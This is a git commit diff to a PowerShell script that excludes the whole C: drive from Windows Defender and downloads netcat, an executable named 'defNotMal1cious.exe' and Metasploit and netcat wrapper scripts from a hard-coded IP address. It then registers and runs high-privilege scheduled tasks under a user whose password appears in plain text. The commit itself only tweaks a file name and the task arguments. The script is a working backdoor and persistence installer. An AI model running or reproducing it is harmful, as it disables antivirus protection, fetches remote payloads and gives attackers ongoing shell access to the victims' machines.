1a6893b7ad7595dace02c63eec358493ab0e13ca
soupsamich <66322946+soupsamich@users.noreply.github.com>
2020-06-28 03:51:44 -0400

    Update windowsScript.ps1

--- windowsScript.ps1
+++ windowsScript.ps1
@@ -1,11 +1,11 @@
 Add-MpPreference -ExclusionPath "C:\";
 Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/nc.exe -OutFile C:/nc.exe;
-Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/defNotMal1cious.exe -OutFile C:/defNotMalicious.exe;
+Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/defNotMal1cious.exe -OutFile C:/defNotMal1cious.exe;
 Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/windowsWrapperMSF.ps1 -OutFile C:/windowsWrapperMSF.ps1;
 Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/windowsWrapperNC.ps1 -OutFile C:/windowsWrapperNC.ps1;
-$Action2=New-ScheduledTaskAction -Execute PowerShell.exe -WorkingDirectory C:/ -Argument “C:\windowsWrapperMSF.ps1";
+$Action2=New-ScheduledTaskAction -Execute Powershell.exe -WorkingDirectory C:/ -Argument .\windowsWrapperMSF.ps1;
+$Action1=New-ScheduledTaskAction -Execute Powershell.exe -WorkingDirectory C:/ -Argument .\windowsWrapperNC.ps1;
 Register-ScheduledTask -TaskName "windowsMSF" -Action $Action2 -RunLevel Highest -User "HashCrackUser1" -Password "This is a basic passphrase";
-$Action1=New-ScheduledTaskAction -Execute PowerShell.exe -WorkingDirectory C:/ -Argument “C:\windowsWrapperNC.ps1";
 Register-ScheduledTask -TaskName "windowsNC" -Action $Action1 -RunLevel Highest -User "HashCrackUser1" -Password "This is a basic passphrase";
 schtasks.exe /run /tn windowsNC;
 schtasks.exe /run /tn windowsMSF;
